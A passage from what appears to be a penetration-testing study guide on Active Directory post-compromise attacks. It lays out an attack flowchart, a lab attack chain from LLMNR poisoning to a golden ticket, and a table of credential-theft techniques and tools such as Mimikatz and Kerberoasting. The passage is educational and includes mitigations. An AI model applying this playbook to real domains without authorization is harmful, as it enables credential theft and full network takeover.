| **Restrict debug privileges** | Limit Mimikatz usage | Restrict SeDebugPrivilege |
| **Monitor for suspicious activity** | Detect credential dumping | Monitor for Mimikatz usage patterns |

---

## Post-Compromise Attack Strategy

### Attack Strategy Flowchart

**Visual Scheme:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    Post-Compromise Attack Strategy              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Initial Access                                              │
│     └─> Valid domain account obtained                          │
│                                                                 │
│  2. Credential Harvesting                                       │
│     ├─> Kerberoasting (service accounts)                       │
│     ├─> secretsdump (SAM/LM hashes)                            │
│     └─> Pass the hash/password (lateral movement)              │
│                                                                 │
│  3. Privilege Escalation                                        │
│     ├─> Token impersonation                                    │
│     ├─> Golden/Silver tickets                                  │
│     └─> LSA/SAM dumping                                        │
│                                                                 │
│  4. Persistence                                                 │
│     ├─> Create new domain users                                │
│     ├─> Add to privileged groups                               │
│     └─> Install backdoors                                      │
│                                                                 │
│  5. If Stuck:                                                  │
│     ├─> BloodHound (attack path analysis)                      │
│     ├─> Look for old vulnerabilities                           │
│     └─> Think outside the box                                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Attack Chain Example

**Visual Scheme:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    Attack Chain Example                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Step 1: LLMNR Poisoning                                        │
│  ────────────────────                                           │
│  • Capture fcastle hash via Responder                           │
│  • Hash: 32ed87bdb5fdc5e9cba88547376818d4                      │
│                                                                 │
│  Step 2: Crack Hash                                             │
│  ────────────────                                               │
│  • Crack with Hashcat                                           │
│  • Password: Password1                                          │
│                                                                 │
│  Step 3: Password Spraying                                      │
│  ────────────────────                                           │
│  • Spray password across network                                │
│  • Find new valid accounts                                      │
│  • Found: administrator on DC01                                 │
│                                                                 │
│  Step 4: secretsdump                                            │
│  ────────────────                                               │
│  • Dump SAM from DC01                                           │
│  • Extract KRBTGT hash                                          │
│  • KRBTGT: 8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2                    │
│                                                                 │
│  Step 5: Golden Ticket                                          │
│  ────────────────                                               │
│  • Create golden ticket for administrator                      │
│  • Access any service in domain                                 │
│                                                                 │
│  Step 6: Domain Admin                                           │
│  ────────────────                                               │
│  • Full domain control achieved                                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Summary of Attack Techniques

| Attack | Purpose | Tools |
|--------|---------|-------|
| **Pass the Password** | Authenticate with plaintext password | crackmapexec, psexec |
| **Pass the Hash** | Authenticate with NTLM hash | crackmapexec, psexec, wmiexec |
| **Kerberoasting** | Crack service account passwords | GetUserSPNs.py, Hashcat |
| **Token Impersonation** | Impersonate privileged users | Metasploit incognito, Mimikatz |
| **LNK File Attacks** | Capture NTLM hashes via malicious files | PowerShell, Responder |
| **GPP/cPassword Attacks** | Decrypt embedded credentials | gpp-decrypt |
| **Mimikatz** | Dump credentials from memory | Mimikatz |

### Key Takeaways

```
┌─────────────────────────────────────────────────────────────────┐
│                    Key Takeaways                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Pass attacks allow authentication without passwords        │
│  2. Kerberoasting targets service accounts with SPNs            │
│  3. Token impersonation allows privilege escalation             │
│  4. LNK files can capture NTLM hashes                          │
│  5. GPP/cPassword vulnerabilities are easily exploitable        │
│  6. Mimikatz is a powerful credential dumping tool             │
│  7. Always use proper authorization for testing                │
│  8. Findings should be used to improve security                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```
